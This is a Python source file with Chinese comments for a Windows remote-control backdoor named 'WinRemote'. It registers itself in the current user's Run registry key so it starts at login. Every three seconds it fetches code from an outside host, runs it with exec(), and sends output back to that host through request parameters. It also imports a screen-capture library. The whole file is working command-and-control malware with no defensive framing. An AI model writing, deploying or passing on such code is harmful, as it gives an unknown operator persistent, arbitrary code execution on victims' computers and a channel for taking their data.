import traceback
import requests
import time
import os
import uuid
import winreg
import platform
import subprocess
import math
import random
import datetime
import sys
import re
import json
import threading
from github import Github
from PIL import ImageGrab


def add_startup_entry(name, file_path):
    """
    将程序添加到Windows启动项
    :param name: 启动项名称
    :param file_path: 程序路径
    """
    # 打开注册表项
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
    # 设置键值对
    winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{file_path}"')
    winreg.CloseKey(key)


def try_exec(code):
    """
    执行代码并捕获异常
    :param code: 待执行的代码字符串
    :return: 执行结果，'nocode'代表无代码，'success'代表执行成功，否则返回异常信息
    """
    if code == '0':
        return 'nocode'
    try:
        exec(code)
        return 'success'
    except:
        error_info = traceback.format_exc()
        return error_info


def get_code():
    """
    从服务器获取待执行的代码
    :return: 待执行的代码字符串，若获取失败则返回'0'
    """
    global id
    try:
        r = requests.get(f'https://7m266q1282.goho.co/code?id={id}').content.decode('utf-8')
        print(f'code: {r}')
        return r
    except:
        return '0'


def log(*info):
    """
    记录日志并发送到服务器
    :param info: 待记录的日志信息，可传入多个参数
    """
    global id
    info_str = ''.join(str(i) for i in info)
    print(f'log: {info_str}')
    try:
        requests.get(f'https://7m266q1282.goho.co/output?id={id}&out={info_str}')
    except:
        pass


if __name__ == "__main__":
    # 生成本机唯一标识符
    id = uuid.uuid4()
    # 获取当前脚本所在目录的绝对路径
    path = os.getcwd()+'\WinRemote.exe'
    # 添加启动项
    add_startup_entry("WinRemote", path)
    while True:
        try:
            # 获取待执行的代码
            code = get_code()
            # 执行代码
            try_exec(code)
            print('-----------------')
            # 暂停3秒钟
            time.sleep(3)
        except KeyboardInterrupt:
            # 若用户按下了Ctrl+C，则中断程序
            print('程序被中断')
            break
        except:
            # 若获取代码或执行代码时发生异常，则暂停3秒钟后重试
            time.sleep(3)
            continue
